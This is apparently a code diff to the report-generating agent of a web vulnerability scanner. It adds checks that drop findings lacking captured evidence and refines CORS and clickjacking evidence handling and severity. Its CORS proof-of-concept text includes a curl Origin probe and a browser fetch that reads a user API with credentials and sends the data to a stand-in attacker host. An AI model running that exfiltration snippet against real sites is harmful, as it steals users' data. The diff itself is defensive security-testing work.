@@ -226,10 +226,27 @@ class ActionAgent:
         actions = []
         for finding in confirmed:
             try:
+                # Refuse PoC emission when upstream evidence is empty —
+                # prevents Confirmed/HIGH + "NO EVIDENCE CAPTURED" contradictions.
+                if not self._finding_has_usable_evidence(finding):
+                    if verbose:
+                        print(
+                            f"   ⚠ Skipping PoC for {finding.get('type','?')} — "
+                            f"empty/insufficient evidence"
+                        )
+                    continue
                 action = self._process_finding(
                     finding, target_url, stack_keywords, hdrs
                 )
                 if action:
+                    # Second gate: action writers must not claim capture without it
+                    if action.get("evidence_captured") is False:
+                        if verbose:
+                            print(
+                                f"   ⚠ Dropping PoC for {finding.get('type','?')} — "
+                                f"writer marked evidence_captured=False"
+                            )
+                        continue
                     actions.append(action)
             except Exception as e:
                 logger.debug(f"Action generation failed for {finding.get('type','?')}: {e}")
@@ -238,6 +255,30 @@ class ActionAgent:
             print(f"   ✓ Generated {len(actions)} action items ({len(confirmed)} confirmed findings)")
 
         return actions
+
+    def _finding_has_usable_evidence(self, finding: Dict) -> bool:
+        ev = finding.get("evidence") or {}
+        if not isinstance(ev, dict) or not ev:
+            return False
+        body = (
+            ev.get("response_body_snippet")
+            or ev.get("body_snippet")
+            or ev.get("response_snippet")
+            or ev.get("db_error_snippet")
+            or ""
+        )
+        headers = ev.get("response_headers") or ev.get("headers") or {}
+        header_vals = []
+        if isinstance(headers, dict):
+            header_vals = [str(v).strip() for v in headers.values() if str(v).strip()]
+        method = str(ev.get("confirmation_method") or "").lower()
+        if method == "header":
+            return bool(header_vals) or bool(ev.get("request") or ev.get("request_line"))
+        if method == "timing":
+            return ev.get("timing_delta_seconds") is not None or bool(ev.get("verified"))
+        if method in ("pattern", "http_body", "dom_reflection", "js_execution"):
+            return bool(str(body).strip())
+        return bool(str(body).strip()) or bool(header_vals)
 
     def _infer_stack_keywords(self, stack: Dict) -> List[str]:
         keywords = []
@@ -298,6 +339,10 @@ class ActionAgent:
         elif "CSRF" in vuln_type:
             return self._action_csrf(location, stack_keywords, evidence)
         elif "Sensitive File" in vuln_type or "Protected Administrative" in vuln_type:
+            return self._action_sensitive_file(vuln_type, location, stack_keywords, evidence)
+        elif "Admin Configuration" in vuln_type or (
+            "Information Disclosure" in vuln_type and "header" not in vuln_type.lower()
+        ):
             return self._action_sensitive_file(vuln_type, location, stack_keywords, evidence)
         else:
             return self._action_generic(vuln_type, severity, location, evidence)
@@ -430,12 +475,34 @@ class ActionAgent:
                               stack_keywords: List[str],
                               evidence: Optional[Dict] = None) -> Dict:
         evidence = evidence or {}
-        xfo_present = evidence.get("checked_headers") is not None
-        evidence_note = (
-            "Captured response had no X-Frame-Options / frame-ancestors CSP directive."
-            if xfo_present else
-            "[NO EVIDENCE CAPTURED — frame-blocking headers were not verified against a live response]"
+        hdrs = evidence.get("response_headers") or evidence.get("headers") or {}
+        if not isinstance(hdrs, dict):
+            hdrs = {}
+        hdrs_lower = {str(k).lower(): str(v) for k, v in hdrs.items()}
+        # Scanners write response_headers with "(missing)" — that IS captured evidence.
+        headers_were_checked = (
+            evidence.get("checked_headers") is not None
+            or bool(hdrs)
+            or evidence.get("confirmation_method") == "header"
         )
+        xfo = hdrs_lower.get("x-frame-options", "")
+        csp = hdrs_lower.get("content-security-policy", "")
+        missing_xfo = (not xfo) or xfo.strip().lower() in ("(missing)", "missing", "")
+        missing_fa = "frame-ancestors" not in (csp or "").lower()
+
+        if headers_were_checked and missing_xfo and missing_fa:
+            evidence_note = (
+                "Captured response had no X-Frame-Options / frame-ancestors CSP directive."
+            )
+        elif headers_were_checked:
+            evidence_note = (
+                "Captured response headers inspected for frame-blocking directives."
+            )
+        else:
+            evidence_note = (
+                "[NO EVIDENCE CAPTURED — frame-blocking headers were not verified "
+                "against a live response]"
+            )
 
         poc = (
             '<!DOCTYPE html>\n'
@@ -470,7 +537,7 @@ class ActionAgent:
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "html",
-            "evidence_captured": xfo_present,
+            "evidence_captured": headers_were_checked,
             "fix_snippet":    fix_snippet,
             "fix_language":   self._fix_language(stack_key),
             "fix_context":    self._fix_context(stack_key, "X-Frame-Options"),
@@ -481,30 +548,78 @@ class ActionAgent:
                      stack_keywords: List[str],
                      evidence: Optional[Dict] = None) -> Dict:
         evidence = evidence or {}
-        reflected_origin = evidence.get("reflected_origin")
-        acao_value       = evidence.get("access_control_allow_origin")
+        headers = evidence.get("response_headers") or evidence.get("headers") or {}
+        if not isinstance(headers, dict):
+            headers = {}
+        # Prefer explicit keys; fall back to standard evidence header map
+        acao_value = (
+            evidence.get("access_control_allow_origin")
+            or headers.get("Access-Control-Allow-Origin")
+            or headers.get("access-control-allow-origin")
+            or ""
+        )
+        reflected_origin = evidence.get("reflected_origin") or ""
+        if not reflected_origin:
+            req = str(evidence.get("request") or "")
+            if "Origin:" in req:
+                # e.g. GET url (Origin: https://evil-cors-test.example.com)
+                reflected_origin = req.split("Origin:", 1)[-1].strip(" )")
+            elif acao_value and acao_value != "*":
+                reflected_origin = acao_value
 
-        if reflected_origin and acao_value:
+        acac_raw = (
+            evidence.get("access_control_allow_credentials")
+            or headers.get("Access-Control-Allow-Credentials")
+            or headers.get("access-control-allow-credentials")
+            or ""
+        )
+        acac_true = str(acac_raw).strip().lower() == "true"
+        is_star = str(acao_value).strip() == "*"
+
+        evidence_captured = bool(acao_value)
+        if evidence_captured:
             evidence_block = (
-                f" Sent Origin header: {reflected_origin}\n"
-                f" Server responded:    Access-Control-Allow-Origin: {acao_value}\n"
-                f" → Attacker-controlled origin was reflected back."
+                f"# Captured Origin probe\n"
+                f"# Sent Origin header: {reflected_origin or 'https://evil-cors-test.example.com'}\n"
+                f"# Server responded:    Access-Control-Allow-Origin: {acao_value}\n"
+                f"# Access-Control-Allow-Credentials: {acac_raw or '(absent)'}\n"
+                f"# → {'Credentialed' if acac_true else ('Wildcard' if is_star else 'Reflected')} origin accepted."
             )
         else:
+            # Caller gates on evidence_captured=False — do not emit contradiction
             evidence_block = (
-                " [NO EVIDENCE CAPTURED — an Origin probe request was not sent/recorded; "
-                "this finding is pattern-based only and needs manual confirmation]"
+                "# [NO EVIDENCE CAPTURED — ACAO value missing from evidence headers]"
             )
+
+        if acac_true:
+            poc2 = (
+                '# PoC 2: Credentialed cross-origin read (ACAC=true confirmed)\n'
+                'fetch("' + location + '/api/user", { credentials: "include" })\n'
+                '  .then(r => r.text())\n'
+                '  .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
+            )
+            cors_severity = "High"
+        elif is_star:
+            poc2 = (
+                '# Note: ACAO=* without credentials — browsers reject credentialed\n'
+                '# requests with wildcard ACAO. Cookie theft via CORS is not enabled.\n'
+                '# Impact is limited to reading public cross-origin responses.'
+            )
+            cors_severity = "Low"
+        else:
+            poc2 = (
+                '# Note: Origin reflected without Allow-Credentials. Anonymous\n'
+                '# cross-origin JS can read the response; cookie-authenticated\n'
+                '# theft requires Access-Control-Allow-Credentials: true.'
+            )
+            cors_severity = "Medium"
 
         poc = (
             '# PoC 1: Verify CORS misconfiguration with curl\n'
             'curl -s -I -H "Origin: https://evil-attacker.example.com" \\\n'
             '  ' + location + ' | grep -i "access-control"\n'
             f'{evidence_block}\n\n'
-            '# PoC 2: Browser-based cross-origin data theft (if credentials are allowed)\n'
-            '# fetch("' + location + '/api/user", { credentials: "include" })\n'
-            '#   .then(r => r.text())\n'
-            '#   .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
+            f'{poc2}'
         )
 
         stack_key = self._best_stack_for_header(stack_keywords)
@@ -553,11 +668,11 @@ class ActionAgent:
 
         return {
             "finding_type":   "CORS Misconfiguration",
-            "severity":       "Medium",
+            "severity":       cors_severity,
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "curl",
-            "evidence_captured": bool(reflected_origin and acao_value),
+            "evidence_captured": evidence_captured,
             "fix_snippet":    fix_snippet,
             "fix_language":   fix_language,
             "fix_context":    fix_context,
@@ -729,12 +844,20 @@ class ActionAgent:
         tech   = "T" if method == "timing" else "E"
 
         timing_delta = evidence.get("timing_delta_seconds")
-        error_text   = evidence.get("db_error_snippet")
+        # Prefer explicit db_error_snippet; fall back to standard body evidence key
+        error_text   = (
+            evidence.get("db_error_snippet")
+            or evidence.get("response_body_snippet")
+            or evidence.get("body_snippet")
+            or ""
+        )
+        evidence_captured = True
         if method == "timing" and timing_delta is not None:
             evidence_note = f"# Captured timing delta: {timing_delta}s on sleep payload"
         elif error_text:
             evidence_note = f"# Captured DB error in response: {error_text[:200]}"
         else:
+            evidence_captured = False
             evidence_note = (
                 "# [NO EVIDENCE CAPTURED — neither a timing delta nor a DB error "
                 "string was recorded; this finding is pattern-based only]"
